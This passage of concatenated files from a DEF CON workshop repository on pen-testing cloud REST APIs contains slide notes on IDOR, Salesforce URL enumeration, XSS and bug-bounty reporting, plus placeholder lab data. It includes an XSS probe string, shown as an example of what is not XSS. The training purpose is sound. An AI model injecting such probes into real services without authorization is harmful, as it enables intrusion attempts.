![](img/ai_generated_trainer_image.png)

[https://github.com/Coalfire-Research/cazt](https://github.com/Coalfire-Research/cazt)

- Simulator of cloud-provider responsible REST APIs
- Six API endpoints for vulnerability discovery
- Tested via gcloud CLI tool
- (Future support for Azure planned)

---

## Authorization Vulnerabilities

- Worst vulnerability
  - Confused deputy or IDOR
  - One customer accessing the data of another customer
- Premise of using a shared cloud service
  - Cloud vendor make contractal agreements to protect data
  - Customer has responsibility for their configuration controls still

---

Next [XSS](xss.md)
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/injection.md`

```markdown
# What is a Custom Salesforce App?

- Salesforce.com
  - Salesforce is cloud-based CRM software (salesforce.com)
- Build Your Own Salesforce App (salesforce.com)
  - Classic apps
    - Tabs, objects, feeds
  - Lightning apps
    - Look and feel customization
- Languages
  - Apex (Java-like)
  - Visualforce
  - JavaScript

---

# Why Test Custom Salesforce Apps?

![](img/why_salesforce_testing1.png)
![](img/why_salesforce_testing2.png)
![](img/why_salesforce_testing3.png)
![](img/why_salesforce_testing4.png)
![](img/why_salesforce_testing5.png)

[https://krebsonsecurity.com/2024/02/juniper-support-portal-exposed-customer-device-info/](https://krebsonsecurity.com/2024/02/juniper-support-portal-exposed-customer-device-info/)

[https://www.scmagazine.com/news/salesforce-community-cloud-data-leaks-misconfigurations](https://www.scmagazine.com/news/salesforce-community-cloud-data-leaks-misconfigurations)

[https://krebsonsecurity.com/2023/04/many-public-salesforce-sites-are-leaking-private-data/](https://krebsonsecurity.com/2023/04/many-public-salesforce-sites-are-leaking-private-data/)

[https://www.bankinfosecurity.com/salesforce-security-alert-api-error-exposed-marketing-data-a-11278](https://www.bankinfosecurity.com/salesforce-security-alert-api-error-exposed-marketing-data-a-11278)

[https://www.darkreading.com/application-security/misconfigured-salesforce-communities-place-orgs-at-risk-of-data-theft-adversary-recon](https://www.darkreading.com/application-security/misconfigured-salesforce-communities-place-orgs-at-risk-of-data-theft-adversary-recon)

---

## Paas Cloud Goat

![](img/paas_cloud_goat.png)

https://github.com/Coalfire-Research/paas-cloud-goat

---

# Lightning (LWC) vs Apex

- VisualForce = page frontend markup
- Apex = backend controller
- Lightning = more modern page framework
  - Replaces Salesforce Classic UI
  - More AJAX or client-side heavy
  - Still uses Apex (and optionally) VisualForce
- URLs for pentesting
  - Lightning = https:// _org_ .develop.lightning.force.com/ __lightning__  __/n__ /XSS2
  - Apex(Classic) = https:// _org_ .develop.vf.force.com/ __apex__ /XSS2

---

# URL Forms

1. Lightning Tab = /lightning/o/CustomObject__c
2. Lightning Tab = /lightning/o/Contacts (built-in)
3. Apex Page = /apex/GuessPageName
4. Salesforce Classic Experience = /a0/l
   - List page
   - Easier to iterate through a0, a1, b1, aa1, etc.

---

# Salesforce Vulnerabilities

- XSS
- SOQL Injection (Salesforce Object Querly Language)
- SOSL Injection (Salesforce Object Search Language)
- Open Redirect
- CSRF
- Encrypted Field Bypass

---

[Reporting Tips](reporting.md)
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/reporting.md`

```markdown
# Reporting Tips

- Re-read the bounty program rules
- Steps to reproduce
  - Use plain-text where possible
    - Easy copy+paste = faster verification by provider
    - Screenshot if necessary for formatting/demo
- Example - Vulnerability accessing other customer's data:
  - Indicate you only accessed your own test data, not other real customers
  - Provide the IAM policies used in test setup
  - For steps to reproduce use
    - Cloud-native CLI tools that developers understand
    - Alternatively curl
    - Alternatively the raw HTTP request manipulated in Burp Suite proxy
  - Include samples of proof of the working exploit
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/xss.md`

```markdown
# OpenStack

- Swift is an object storage service
- API for adding objects
- Not filesystem storage
  - Object key names are not filenames
  - As for many other cloud providers almost any byte sequence can be used in the key name

---

# XSS a Cloud REST API

What is _not_ Cross-Site Scripting?

- Description field with `<script>alert(document.domain)</script>`

![](img/not_xss_1.png)
![](img/not_xss_2.png)

---

# REST API - HTTP Response and XSS

Just having tags doesn't make it a vulnerability

![](img/not_xss_3.png)

---

# What is Cross-Site Scripting?

- Is this a persistent XSS vulnerability?
  - Web UI parses JSON
    - Most libraries make this unlikely
  - But still a possibility (ಠ◡ಠ)
- What if the response was not?
  - Content-type: application/json

![](img/not_xss_3.png)

---

# XSS Backdoor via API

- Have this simple UI for uploading pictures
- The UI interface restricted filenames correctly
  - Just a-z and nothing else
- What if we don't use the upload button?

![](img/xss_backdoor_via_api_ui.png)

---

Next [Injection](injection.md)
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/demo-testdata/super-secret-doc-for-account2-only.txt`

```text
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc semper efficitur eros, vitae laoreet quam malesuada sed. Etiam ac tristique massa, ut sollicitudin turpis. Nunc feugiat risus at libero bibendum tempor. Nullam placerat porttitor felis, vel elementum nisl luctus non. Nunc eget nisl tortor. Aenean tristique, lacus tristique pellentesque ultrices, dui ipsum malesuada massa, ut efficitur magna augue eu augue. Etiam est ex, dapibus at elit quis, volutpat mattis felis. Nunc eget turpis lacinia, pulvinar elit sed, suscipit tortor. Nam porttitor tortor at tempus fermentum.

Quisque non dapibus tortor. Vestibulum dignissim ex at felis viverra auctor. Nullam condimentum enim non felis pellentesque placerat. Nulla ultrices augue ante, sit amet malesuada mauris sodales ut. Duis finibus, augue at vulputate laoreet, mi justo posuere sem, sit amet condimentum nisl magna nec diam. Suspendisse ultricies nulla accumsan, auctor ante vel, aliquet justo. Morbi non lorem nec libero fermentum dictum eu sodales mauris. Morbi molestie et augue eget laoreet. Proin commodo lectus eu nunc feugiat laoreet. Nulla facilisi. Quisque placerat blandit tortor, in pretium felis tincidunt at. Phasellus gravida massa ut mi pulvinar, nec tempus ex ornare. Curabitur rhoncus massa sit amet magna tristique malesuada.

Aenean et nisl bibendum, fermentum eros sit amet, fermentum lorem. Integer vel porttitor nulla, bibendum semper enim. Quisque elementum tellus est, vitae hendrerit purus interdum eu. Morbi dignissim, tortor consequat interdum ornare, elit justo efficitur diam, quis faucibus quam nisl sit amet ante. Pellentesque tempor neque a dolor sollicitudin, ut malesuada ex interdum. Donec at metus nisl. Duis id enim nec diam ullamcorper blandit in vel ex. Phasellus id arcu ut metus consectetur sagittis. Quisque in mollis lorem. Aenean non sapien scelerisque, viverra lectus id, rhoncus elit. Vivamus feugiat sapien ligula, eget tempus eros semper ut.

Donec eu risus quis sapien suscipit placerat. Integer placerat nibh tortor, at pretium lacus porta id. Cras rutrum velit ligula, sit amet ultrices lectus convallis vitae. Sed gravida vestibulum enim sed finibus. Sed urna mi, commodo vel feugiat eu, consequat ac sem. Aliquam ornare neque enim, vitae vulputate arcu tincidunt eu. Donec faucibus erat ante, nec tristique mauris faucibus pulvinar. Vivamus et nulla ullamcorper, placerat augue mollis, varius lectus. Suspendisse nec lectus odio.

Vivamus venenatis blandit lectus ac ornare. Quisque tincidunt ipsum sed sapien porta, quis ullamcorper urna sagittis. Sed ac malesuada massa. Integer commodo placerat tincidunt. Quisque vitae libero interdum, gravida quam id, ultrices eros. Sed interdum nulla et sapien rutrum, vitae consectetur nibh suscipit. Aliquam aliquet efficitur porta. Nunc vel molestie nisl. Integer elementum justo sed dignissim varius. Integer aliquet massa venenatis, euismod dui quis, euismod metus. Morbi id metus vel risus varius rhoncus vel in elit. Vivamus semper felis pellentesque vulputate commodo.
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/workshop_event/IP addresses.txt`

```text
203.0.113.1

203.0.113.30	client@203.0.113.30

203.0.113.20	CAZT

203.0.113.10	OpenStack server
```
